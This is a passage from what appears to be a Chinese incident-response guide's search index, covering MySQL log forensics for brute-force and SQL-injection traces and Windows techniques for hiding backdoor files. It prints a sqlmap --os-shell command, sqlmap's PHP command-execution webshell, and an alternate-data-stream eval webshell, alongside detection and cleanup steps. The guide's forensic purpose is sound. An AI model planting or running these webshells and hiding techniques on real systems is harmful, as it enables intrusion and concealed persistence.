autocommit=0 100 Quit \u4f46\u662f\uff0c\u5982\u679c\u4f60\u662f\u7528\u5176\u4ed6\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u70b9\u70b9\u4e0d\u4e00\u6837\u7684\u54e6\u3002 Navicat for MySQL\u767b\u5f55\uff1a 190601 22:14:07 106 Connect root@192.168.204.1 on 106 Query SET NAMES utf8 106 Query SHOW VARIABLES LIKE 'lower_case_%' 106 Query SHOW VARIABLES LIKE 'profiling' 106 Query SHOW DATABASES \u547d\u4ee4\u884c\u767b\u5f55\uff1a 190601 22:17:25 111 Connect root@localhost on 111 Query select @@version_comment limit 1 190601 22:17:56 111 Quit \u8fd9\u4e2a\u5dee\u522b\u5728\u4e8e\uff0c\u4e0d\u540c\u7684\u6570\u636e\u5e93\u8fde\u63a5\u5de5\u5177\uff0c\u5b83\u5728\u8fde\u63a5\u6570\u636e\u5e93\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u540c\u7684\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u5dee\u522b\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5224\u65ad\u51fa\u7528\u6237\u662f\u901a\u8fc7\u8fde\u63a5\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u3002 \u53e6\u5916\uff0c\u4e0d\u7ba1\u4f60\u662f\u7206\u7834\u5de5\u5177\u3001Navicat for MySQL\u3001\u8fd8\u662f\u547d\u4ee4\u884c\uff0c\u767b\u5f55\u5931\u8d25\u90fd\u662f\u4e00\u6837\u7684\u8bb0\u5f55\u3002 \u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff1a 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) \u5229\u7528shell\u547d\u4ee4\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\uff1a #\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f4|uniq -c|sort -nr 27 192.168.204.1 #\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f2|uniq -c|sort -nr 13 mysql 12 root 1 root 1 mysql \u5728\u65e5\u5fd7\u5206\u6790\u4e2d\uff0c\u7279\u522b\u9700\u8981\u6ce8\u610f\u4e00\u4e9b\u654f\u611f\u7684\u64cd\u4f5c\u884c\u4e3a\uff0c\u6bd4\u5982\u5220\u8868\u3001\u5907\u5e93\uff0c\u8bfb\u5199\u6587\u4ef6\u7b49\u3002\u5173\u952e\u8bcd\uff1adrop table\u3001drop function\u3001lock tables\u3001unlock tables\u3001load_file() \u3001into outfile\u3001into dumpfile\u3002 \u654f\u611f\u6570\u636e\u5e93\u8868\uff1aSELECT * from mysql.user\u3001SELECT * from mysql.func 0x03 SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9 \u00b6 \u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6tmpbwyov.php\uff0c\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2a\u6728\u9a6c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u9875\u9762\u5c55\u793a\u3002 tmpbwyov.php\uff1a &1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print \" \".$w.\" \";?> ` \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u7f51\u7ad9\u76ee\u5f55\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u53ef\u7591\u6587\u4ef6\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u68c0\u67e5\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u662f\u5426\u5b58\u5728\u4e00\u4e9b\u6728\u9a6c\u6587\u4ef6\uff1a 2\u3001\u68c0\u67e5\u662f\u5426\u6709UDF\u63d0\u6743\u3001MOF\u63d0\u6743\u75d5\u8ff9 \u68c0\u67e5\u76ee\u5f55\u662f\u5426\u6709\u5f02\u5e38\u6587\u4ef6 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ \u68c0\u67e5\u51fd\u6570\u662f\u5426\u5220\u9664 select * from mysql.func 3\u3001\u7ed3\u5408web\u65e5\u5fd7\u5206\u6790\u3002","title":"\u7b2c5\u7bc7\uff1aMySQL\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#\u7b2c5\u7bc7mysql\u65e5\u5fd7\u5206\u6790","text":"\u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002","title":"\u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-mysql\u65e5\u5fd7\u5206\u6790","text":"general query log\u80fd\u8bb0\u5f55\u6210\u529f\u8fde\u63a5\u548c\u6bcf\u6b21\u6267\u884c\u7684\u67e5\u8be2\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u7528\u4f5c\u5b89\u5168\u5e03\u9632\u7684\u4e00\u90e8\u5206\uff0c\u4e3a\u6545\u969c\u5206\u6790\u6216\u9ed1\u5ba2\u4e8b\u4ef6\u540e\u7684\u8c03\u67e5\u63d0\u4f9b\u4f9d\u636e\u3002 1\u3001\u67e5\u770blog\u914d\u7f6e\u4fe1\u606f show variables like '%general%'; 2\u3001\u5f00\u542f\u65e5\u5fd7 SET GLOBAL general_log = 'On'; 3\u3001\u6307\u5b9a\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 #SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log'; \u6bd4\u5982\uff0c\u5f53\u6211\u8bbf\u95ee /test.php?id=1\uff0c\u6b64\u65f6\u6211\u4eec\u5f97\u5230\u8fd9\u6837\u7684\u65e5\u5fd7\uff1a 190604 14:46:14 14 Connect root@localhost on 14 Init DB test 14 Query SELECT * FROM admin WHERE id = 1 14 Quit ` \u6211\u4eec\u6309\u5217\u6765\u89e3\u6790\u4e00\u4e0b\uff1a \u7b2c\u4e00\u5217:Time\uff0c\u65f6\u95f4\u5217\uff0c\u524d\u9762\u4e00\u4e2a\u662f\u65e5\u671f,\u540e\u9762\u4e00\u4e2a\u662f\u5c0f\u65f6\u548c\u5206\u949f\uff0c\u6709\u4e00\u4e9b\u4e0d\u663e\u793a\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e9bsql\u8bed\u53e5\u51e0\u4e4e\u662f\u540c\u65f6\u6267\u884c\u7684,\u6240\u4ee5\u5c31\u4e0d\u53e6\u5916\u8bb0\u5f55\u65f6\u95f4\u4e86\u3002 \u7b2c\u4e8c\u5217:Id\uff0c\u5c31\u662fshow processlist\u51fa\u6765\u7684\u7b2c\u4e00\u5217\u7684\u7ebf\u7a0bID,\u5bf9\u4e8e\u957f\u8fde\u63a5\u548c\u4e00\u4e9b\u6bd4\u8f83\u8017\u65f6\u7684sql\u8bed\u53e5,\u4f60\u53ef\u4ee5\u7cbe\u786e\u627e\u51fa\u7a76\u7adf\u662f\u90a3\u4e00\u6761\u90a3\u4e00\u4e2a\u7ebf\u7a0b\u5728\u8fd0\u884c\u3002 \u7b2c\u4e09\u5217:Command\uff0c\u64cd\u4f5c\u7c7b\u578b\uff0c\u6bd4\u5982Connect\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0cQuery\u5c31\u662f\u67e5\u8be2\u6570\u636e\u5e93(\u589e\u5220\u67e5\u6539\u90fd\u663e\u793a\u4e3a\u67e5\u8be2)\uff0c\u53ef\u4ee5\u7279\u5b9a\u8fc7\u8651\u4e00\u4e9b\u64cd\u4f5c\u3002 \u7b2c\u56db\u5217:Argument\uff0c\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982 Connect root@localhost on \u610f\u601d\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0c\u5982\u6b64\u7c7b\u63a8,\u63a5\u4e0b\u9762\u7684\u8fde\u4e0a\u6570\u636e\u5e93\u4e4b\u540e,\u505a\u4e86\u4ec0\u4e48\u67e5\u8be2\u7684\u64cd\u4f5c\u3002","title":"0x01 Mysql\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02-\u767b\u5f55\u6210\u529f\u5931\u8d25","text":"\u6211\u4eec\u6765\u505a\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u5427\uff0c\u4f7f\u7528\u6211\u4ee5\u524d\u81ea\u5df1\u5f00\u53d1\u7684\u5f31\u53e3\u4ee4\u5de5\u5177\u6765\u626b\u4e00\u4e0b\uff0c\u5b57\u5178\u8bbe\u7f6e\u6bd4\u8f83\u5c0f\uff0c2\u4e2a\u7528\u6237\uff0c4\u4e2a\u5bc6\u7801\uff0c\u51718\u7ec4\u3002 MySQL\u4e2d\u7684log\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\uff1a Time Id Command Argument 190601 22:03:20 98 Connect root@192.168.204.1 on 98 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 103 Connect mysql@192.168.204.1 on 103 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 104 Connect mysql@192.168.204.1 on 104 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Connect root@192.168.204.1 on 101 Connect root@192.168.204.1 on 101 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 99 Connect root@192.168.204.1 on 99 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 105 Connect mysql@192.168.204.1 on 105 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Query set autocommit=0 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Quit ` \u4f60\u77e5\u9053\u5728\u8fd9\u4e2a\u53e3\u4ee4\u731c\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u54ea\u4e2a\u662f\u6210\u529f\u7684\u5417\uff1f \u5229\u7528\u7206\u7834\u5de5\u5177\uff0c\u4e00\u4e2a\u53e3\u4ee4\u731c\u89e3\u6210\u529f\u7684\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\u7684\uff1a 190601 22:03:20 100 Connect root@192.168.204.1 on 100 Query set autocommit=0 100 Quit \u4f46\u662f\uff0c\u5982\u679c\u4f60\u662f\u7528\u5176\u4ed6\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u70b9\u70b9\u4e0d\u4e00\u6837\u7684\u54e6\u3002 Navicat for MySQL\u767b\u5f55\uff1a 190601 22:14:07 106 Connect root@192.168.204.1 on 106 Query SET NAMES utf8 106 Query SHOW VARIABLES LIKE 'lower_case_%' 106 Query SHOW VARIABLES LIKE 'profiling' 106 Query SHOW DATABASES \u547d\u4ee4\u884c\u767b\u5f55\uff1a 190601 22:17:25 111 Connect root@localhost on 111 Query select @@version_comment limit 1 190601 22:17:56 111 Quit \u8fd9\u4e2a\u5dee\u522b\u5728\u4e8e\uff0c\u4e0d\u540c\u7684\u6570\u636e\u5e93\u8fde\u63a5\u5de5\u5177\uff0c\u5b83\u5728\u8fde\u63a5\u6570\u636e\u5e93\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u540c\u7684\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u5dee\u522b\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5224\u65ad\u51fa\u7528\u6237\u662f\u901a\u8fc7\u8fde\u63a5\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u3002 \u53e6\u5916\uff0c\u4e0d\u7ba1\u4f60\u662f\u7206\u7834\u5de5\u5177\u3001Navicat for MySQL\u3001\u8fd8\u662f\u547d\u4ee4\u884c\uff0c\u767b\u5f55\u5931\u8d25\u90fd\u662f\u4e00\u6837\u7684\u8bb0\u5f55\u3002 \u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff1a 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) \u5229\u7528shell\u547d\u4ee4\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\uff1a #\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f4|uniq -c|sort -nr 27 192.168.204.1 #\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f2|uniq -c|sort -nr 13 mysql 12 root 1 root 1 mysql \u5728\u65e5\u5fd7\u5206\u6790\u4e2d\uff0c\u7279\u522b\u9700\u8981\u6ce8\u610f\u4e00\u4e9b\u654f\u611f\u7684\u64cd\u4f5c\u884c\u4e3a\uff0c\u6bd4\u5982\u5220\u8868\u3001\u5907\u5e93\uff0c\u8bfb\u5199\u6587\u4ef6\u7b49\u3002\u5173\u952e\u8bcd\uff1adrop table\u3001drop function\u3001lock tables\u3001unlock tables\u3001load_file() \u3001into outfile\u3001into dumpfile\u3002 \u654f\u611f\u6570\u636e\u5e93\u8868\uff1aSELECT * from mysql.user\u3001SELECT * from mysql.func","title":"0x02 \u767b\u5f55\u6210\u529f/\u5931\u8d25"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x03--sql\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9","text":"\u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6tmpbwyov.php\uff0c\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2a\u6728\u9a6c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u9875\u9762\u5c55\u793a\u3002 tmpbwyov.php\uff1a &1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print \" \".$w.\" \";?> ` \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u7f51\u7ad9\u76ee\u5f55\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u53ef\u7591\u6587\u4ef6\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u68c0\u67e5\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u662f\u5426\u5b58\u5728\u4e00\u4e9b\u6728\u9a6c\u6587\u4ef6\uff1a 2\u3001\u68c0\u67e5\u662f\u5426\u6709UDF\u63d0\u6743\u3001MOF\u63d0\u6743\u75d5\u8ff9 \u68c0\u67e5\u76ee\u5f55\u662f\u5426\u6709\u5f02\u5e38\u6587\u4ef6 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ \u68c0\u67e5\u51fd\u6570\u662f\u5426\u5220\u9664 select * from mysql.func 3\u3001\u7ed3\u5408web\u65e5\u5fd7\u5206\u6790\u3002","title":"0x03  SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/","text":"0x00 \u524d\u8a00 \u00b6 \u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6765\u7ef4\u6301\u6743\u9650\uff0c\u5982\u679c\u4f60\u60f3\u8ba9\u4f60\u7684\u540e\u95e8\u4fdd\u6301\u7684\u66f4\u4e45\u4e9b\uff0c\u90a3\u4e48\u8bf7\u9690\u85cf\u597d\u5b83\uff0c\u4f7f\u4e4b\u4e0d\u6613\u88ab\u7ba1\u7406\u5458\u53d1\u73b0\u3002 0x01 \u9690\u85cf\u6587\u4ef6 \u00b6 1\u3001\u5229\u7528\u6587\u4ef6\u5c5e\u6027 \u6700\u7b80\u5355\u7684\u4e00\u79cd\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\uff0c\u6587\u4ef6\u53f3\u952e\u5c5e\u6027\uff0c\u52fe\u9009\u9690\u85cf\uff0c\u70b9\u51fb\u786e\u5b9a\u540e\uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u91cc\u770b\u4e0d\u5230\u521a\u521a\u7684\u6587\u4ef6\u4e86\u3002 \u5982\u679c\u8981\u8ba9\u6587\u4ef6\u663e\u793a\u51fa\u6765\uff0c\u5c31\u70b9\u51fb\u67e5\u770b\uff0c\u52fe\u9009\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\uff0c\u6587\u4ef6\u5c31\u663e\u793a\u51fa\u6765\u3002 \u5982\u4f55\u771f\u6b63\u9690\u85cf\u6587\u4ef6\uff1f \u4f7f\u7528Attrib +s +a +h +r\u547d\u4ee4\u5c31\u662f\u628a\u539f\u672c\u7684\u6587\u4ef6\u5939\u589e\u52a0\u4e86\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u548c\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002 attrib +s +a +h +r D:\\test\\project\\test .txt \u8fd9\u6837\u5c31\u505a\u5230\u4e86\u771f\u6b63\u7684\u9690\u85cf\uff0c\u4e0d\u7ba1\u4f60\u662f\u5426\u663e\u793a\u9690\u85cf\u6587\u4ef6\uff0c\u6b64\u6587\u4ef6\u5939\u90fd\u770b\u4e0d\u89c1\u3002 \u7834\u89e3\u9690\u85cf\u6587\u4ef6\uff1a \u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u5229\u7528ADS\u9690\u85cf\u6587\u4ef6\u5185\u5bb9 \u200b \u5728\u670d\u52a1\u5668\u4e0aecho\u4e00\u4e2a\u6570\u636e\u6d41\u6587\u4ef6\u8fdb\u53bb\uff0c\u6bd4\u5982index.php\u662f\u7f51\u9875\u6b63\u5e38\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5b50\u641e\uff1a \u3000 echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg \u8fd9\u6837\u5b50\u5c31\u751f\u6210\u4e86\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684shell hidden.jpg\uff0c\u5e38\u89c4\u7684\u6587\u4ef6\u7ba1\u7406\u5668\u3001type\u547d\u4ee4\uff0cdir\u547d\u4ee4\u3001del\u547d\u4ee4\u53d1\u73b0\u90fd\u627e\u4e0d\u51fa\u90a3\u4e2ahidden.jpg\u7684\u3002\u3000 \u95ee\u98981\uff1a\u5982\u4f55\u67e5\u770bindex.php:hidden.jpg\u5185\u5bb9\u5462\uff1f \u3000\u3000 \u8fdb\u5165\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff0cnotepad index.php:hidden.jpg \u6216\u8005 dir /r \u3000\u3000 \u95ee\u98982\uff1a\u5982\u4f55\u5220\u9664index.php:hidden.jpg\uff1f \u76f4\u63a5\u5220\u9664index.php\u5373\u53ef 3\u3001\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf \u9a71\u52a8\u9690\u85cf\u6211\u4eec\u53ef\u4ee5\u7528\u8fc7\u4e00\u4e9b\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u8f6f\u4ef6\u540d\u5b57\u53eb\uff1aEasy File Locker \u4e0b\u8f7d\u94fe\u63a5\uff1a http://www.xoslab.com/efl.html \u5982\u679c\u4f60\u5728\u7f51\u7ad9\u76ee\u5f55\u672a\u67e5\u627e\u5230\u76f8\u5173\u6587\u4ef6\uff0c\u4e14\u7cfb\u7edf\u76ee\u5f55\u5b58\u5728\u5b58\u5728\u4ee5\u4e0b\u6587\u4ef6\uff1a c:\\WINDOWS\\xlkfs.dat c:\\WINDOWS\\xlkfs.dll c:\\WINDOWS\\xlkfs.ini c:\\WINDOWS\\system32\\drivers\\xlkfs.sys \u90a3\u4e48\u4f60\uff0c\u5e94\u8be5\u662f\u906d\u9047\u4e86\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u67e5\u8be2\u670d\u52a1\u72b6\u6001\uff1a sc qc xlkfs 2\u3001\u505c\u6b62\u670d\u52a1\uff1a net stop xlkfs \u670d\u52a1\u505c\u6b62\u4ee5\u540e\uff0c\u7ecf\u9a71\u52a8\u7ea7\u9690\u85cf\u7684\u6587\u4ef6\u5373\u53ef\u663e\u73b0 3\u3001\u5220\u9664\u670d\u52a1\uff1a sc delete xlkfs 4\u3001\u5220\u9664\u7cfb\u7edf\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u91cd\u542f\u7cfb\u7edf\uff0c\u786e\u8ba4\u670d\u52a1\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86\u3002 \u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u8fd8\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u4f2a\u88c5\u6210\u4e00\u4e2a\u7cfb\u7edf\u6587\u4ef6\u5939\u56fe\u6807\uff0c\u5229\u7528\u7578\u5f62\u6587\u4ef6\u540d\u3001\u4fdd\u7559\u6587\u4ef6\u540d\u65e0\u6cd5\u5220\u9664\uff0c\u751a\u81f3\u53d6\u4e00\u4e2a\u4e0e\u7cfb\u7edf\u6587\u4ef6\u5f88\u50cf\u7684\u6587\u4ef6\u540d\u5e76\u653e\u5728\u6b63\u5e38\u76ee\u5f55\u91cc\u9762\uff0c\u5f88\u96be\u8fa8\u522b\u51fa\u6765\u3002 \u8fd9\u4e9b\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u65e9\u5df2\u4e0d\u518d\u662f\u79d8\u5bc6\uff0c\u800c\u66f4\u591a\u7684\u6076\u610f\u7a0b\u5e8f\u5f00\u59cb\u5b9e\u73b0\u201c\u65e0\u6587\u4ef6\u201d\u653b\u51fb\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6781\u96be\u88ab\u53d1\u73b0\u3002 0x02 \u9690\u85cf\u8d26\u53f7 \u00b6 window 